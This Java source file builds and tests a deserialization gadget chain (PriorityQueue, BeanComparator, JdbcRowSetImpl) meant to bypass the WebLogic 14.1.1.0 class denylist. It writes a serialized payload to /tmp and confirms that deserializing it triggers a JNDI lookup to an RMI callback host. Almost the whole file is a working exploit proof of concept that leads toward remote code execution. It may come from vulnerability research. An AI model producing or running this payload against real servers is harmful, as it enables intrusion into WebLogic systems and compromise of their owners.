import java.io.*;
import java.lang.reflect.*;
import java.util.*;

/**
 * Final chain verification: Simplified CB1 (PQ + BeanComparator + JdbcRowSetImpl)
 * No InvertibleComparator needed. All classes NOT on WebLogic 14.1.1.0 denylist.
 */
public class WL7Final {
    public static void main(String[] args) throws Exception {
        String callback = args.length > 0 ? args[0] : "rmi://host.docker.internal:1389/WL7_FINAL";
        System.out.println("=== Simplified CB1 Chain Test ===");
        System.out.println("Callback: " + callback + "\n");

        Class<?> beanCompClass = Class.forName("org.apache.commons.beanutils.BeanComparator");
        Object beanComp = beanCompClass.getDeclaredConstructor(String.class)
            .newInstance("databaseMetaData");

        Class<?> jrsClass = Class.forName("com.sun.rowset.JdbcRowSetImpl");
        Object jrs1 = jrsClass.getDeclaredConstructor().newInstance();
        jrsClass.getMethod("setDataSourceName", String.class).invoke(jrs1, callback);
        Object jrs2 = jrsClass.getDeclaredConstructor().newInstance();
        jrsClass.getMethod("setDataSourceName", String.class).invoke(jrs2, callback);

        PriorityQueue pq = new PriorityQueue(2, (Comparator) beanComp);
        Field queueField = PriorityQueue.class.getDeclaredField("queue");
        queueField.setAccessible(true);
        Field sizeField = PriorityQueue.class.getDeclaredField("size");
        sizeField.setAccessible(true);
        queueField.set(pq, new Object[]{jrs1, jrs2});
        sizeField.set(pq, 2);

        // Serialize
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(pq);
        oos.close();
        byte[] data = bos.toByteArray();
        System.out.println("Serialized: " + data.length + " bytes");

        // Save
        try (FileOutputStream fos = new FileOutputStream("/tmp/cb1_simplified.bin")) {
            fos.write(data);
        }
        System.out.println("Saved to /tmp/cb1_simplified.bin");

        // Deserialize
        System.out.println("\nDeserializing...");
        try {
            ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
            Object result = ois.readObject();
            System.out.println("Result: " + result);
        } catch (Throwable e) {
            // Walk FULL cause chain
            System.out.println("Exception: " + e.getClass().getName());
            Throwable cause = e;
            int depth = 0;
            boolean jndiFound = false;
            while (cause != null && depth < 15) {
                String s = cause.toString();
                System.out.println("  [" + depth + "] " + cause.getClass().getName() + ": " +
                    truncate(cause.getMessage(), 200));
                if (s.contains("JNDI") || s.contains("connect") || s.contains("naming")
                    || s.contains("lookup") || s.contains("Connection refused")
                    || s.contains("NamingException") || s.contains("CommunicationException")
                    || s.contains("ConnectException")) {
                    jndiFound = true;
                    System.out.println("    ^^^ JNDI/CONNECT EVIDENCE ^^^");
                }
                cause = cause.getCause();
                depth++;
            }

            // Also check full stack trace for JNDI evidence
            StringWriter sw = new StringWriter();
            e.printStackTrace(new PrintWriter(sw));
            String trace = sw.toString();
            boolean traceJndi = trace.contains("javax.naming") || trace.contains("InitialContext")
                || trace.contains("connect(") || trace.contains("JNDI")
                || trace.contains("lookup") || trace.contains("Connection refused");

            if (jndiFound || traceJndi) {
                System.out.println("\n*** CHAIN CONFIRMED ***");
                System.out.println("PQ.readObject -> BeanComparator.compare -> getDatabaseMetaData -> connect -> JNDI");
                System.out.println("\nClasses used (NONE on WebLogic 14.1.1.0 denylist):");
                System.out.println("  java.util.PriorityQueue");
                System.out.println("  org.apache.commons.beanutils.BeanComparator");
                System.out.println("  com.sun.rowset.JdbcRowSetImpl");
            }

            // Print relevant stack trace lines
            System.out.println("\nRelevant stack trace:");
            for (String line : trace.split("\n")) {
                String l = line.toLowerCase();
                if (l.contains("priorityqueue") || l.contains("beancomparator")
                    || l.contains("propertyutils") || l.contains("jdbcrowset")
                    || l.contains("connect") || l.contains("jndi")
                    || l.contains("naming") || l.contains("heapify")
                    || l.contains("siftdown") || l.contains("lookup")
                    || l.contains("caused by")) {
                    System.out.println("  " + line.trim());
                }
            }
        }
    }

    static String truncate(String s, int max) {
        if (s == null) return "null";
        return s.length() > max ? s.substring(0, max) + "..." : s;
    }
}
